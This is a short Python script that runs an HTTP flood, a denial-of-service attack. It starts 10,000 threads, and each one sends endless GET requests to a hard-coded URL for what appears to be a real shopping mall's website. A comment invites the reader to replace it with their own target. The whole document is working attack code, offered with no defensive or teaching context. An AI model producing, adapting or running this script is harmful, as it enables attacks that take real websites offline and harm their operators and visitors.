import requests
import threading

def flood(url):
    while True:
        try:
            requests.get(url)
            print(f"Flooding {url}")
        except requests.exceptions.RequestException:
            print("Request failed")

if __name__ == "__main__":
    target_url = "https://www.starmalls.com.ph/malls/san-jose-del-monte/"  # Replace with your target URL
    for i in range(10000):  # Number of threads
        thread = threading.Thread(target=flood, args=(target_url,))
        thread.start()
